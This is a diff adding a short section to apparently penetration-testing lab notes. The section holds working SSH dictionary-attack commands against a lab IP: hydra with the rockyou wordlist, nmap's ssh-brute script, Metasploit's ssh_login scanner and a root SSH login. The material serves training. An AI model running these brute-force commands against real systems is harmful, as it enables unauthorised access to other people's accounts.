@@ -250,8 +250,18 @@ nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, s
 16)  SSH Recon: Dictionary Attack
 
 ```
-
-
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+hydra -l student -P /usr/share/wordlists/rockyou.txt 192.40.231.3 ssh
+echo "administrator" > users
+nmap -p 22 --script ssh-brute --script-args userdb=/root/users 192.40.231.3
+msfconsole
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.40.231.3
+set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
+set STOP_ON_SUCCESS true
+set verbose true
+exploit
+ssh root@192.40.231.3
 
 ```
 
